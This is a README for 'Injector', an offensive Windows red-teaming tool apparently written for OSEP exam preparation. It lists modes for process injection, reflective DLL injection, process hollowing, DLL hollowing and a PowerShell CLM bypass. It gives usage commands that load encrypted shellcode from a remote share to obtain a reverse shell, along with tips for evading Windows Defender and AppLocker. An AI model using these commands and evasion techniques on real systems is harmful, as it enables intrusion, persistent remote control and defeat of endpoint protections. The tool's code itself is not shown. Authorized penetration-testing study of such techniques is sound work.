# Injector
Complete Arsenal of Memory injection and other techniques for red-teaming in Windows

Note: Working to add DInvoke for EDR bypass as well. Stay tuned :)

# What does Injector do?

- Process injection support for shellcode located at remote server as well as local storage. Just specify the shellcode file and it will do the rest. It will by default inject into notepad.exe and if not found, it will create a notepad process and inject into it for persistence.
- Reflective DLL Injection for DLL injection. It downloads the DLL and injects into remote process.
- Process hollowing via svchosts.exe
- With -bypass flag it tends to use more advanced un-documented API for process injeciton and the routine itself gets changes.
- Now even supports encrypted shellcode i.e AES encrypted and Xor encryted shellcode are now supported. To encrypt the shellcode use Helper.exe in order to maintain consistency.  
- Supports CLM bypass for powershell. Just drop it to a whitelisted folder where you can execute C# binary, for instance at C:\\Windows\\Tasks
- Now comes with support for DLL Hollowing. DLL hollowing is implemented via the dll_hollow.dll! So in case you end up using this mode, make sure the dll and the exe are in same place.

```
C:\Users\admin>Injector.exe
Help Options for Xenon:
-m       Mode of operation
        -m 1     Specifies the mode as Process injection
        -m 2     Specifies the mode as Reflective DLL Injection
        -m 3     Specifies the mode as Process Hollowing
        -m 4     No injection! Give me my damn shell
        -m 5     Powershell session via CLM bypass
        -m 6     DLL hollowing

-TempFile        File location that your current user can read
-shellcode       Use shellcode
-dll     Use dll
-decrypt-xor     Specify Xor decryption for shellcode
         -pass   Specifty the password for Xor decryption
-decrypt-aes     Specify aes decryption for shellcode
         -pass   Specifty the password for aes decryption
-location        Specify the location i.e either server or local
-bypass         Uses enhance attempts to bypass AV
```
To generate encrypted shellcode, use Helper.exe on kali along with proper switch.

### Example of usage

```
Injector.exe -m=1 -shellcode -encrypt-aes -pass=password -location="\\192.x.x.x\share\shellcode.txt" -bypass
```
This is will decrypt your shellcode and give you reverse shell. Presence of bypass flag instructs injector to use some other ways to get reverse shell i.e using some undocumented Win API.

In case you dont wanna use encrypted shellcode, you can also run it simply like below

```
Injector.exe -m=1 -shellcode -location="\\192.x.x.x\share\shellcode.txt"
```
Just change the -m=1 to 2,3,4,6 to run other modes. 

```
Injector.exe -m=5 -TempFile=C:\\Users\\user\\sample.txt
```
This will give you a session where you can execute IEX cradle and get a proper reverse shell hence bypassing CLM.

## Help me with Antivirus?

A specific function called basic_rev in Program.cs of Injector triggers windows defender. It is advised to edit the function and remove the WaitForSingleObject line which will end up making that whole module useless but helps to bypass defender on Windows. Why to use a basic reverse shell mode when advance modes will give you persistence and help evade defender better :)

# Why make it?

Main aim is to help me in OSEP :P

# Powershell 

You can use Invoke-Exe.ps1 to execute Injector from powershell in case there is applocker restriction on .NET execution.
```
Invoke-Exe -loc C:\Users\john\injector.exe
```
Note : Use the Debug build of Injector to load it Reflectivly in powershell.

# Talk to me?

Shoot me a DM on twitter @gh0st_R1d3r_0x9 to talk abt more interesting indeas/modules that can make this more amazing!

Current module in pipeline
- Phantom DLL Injection

# Acknowledgements

[Ired Team](https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection)
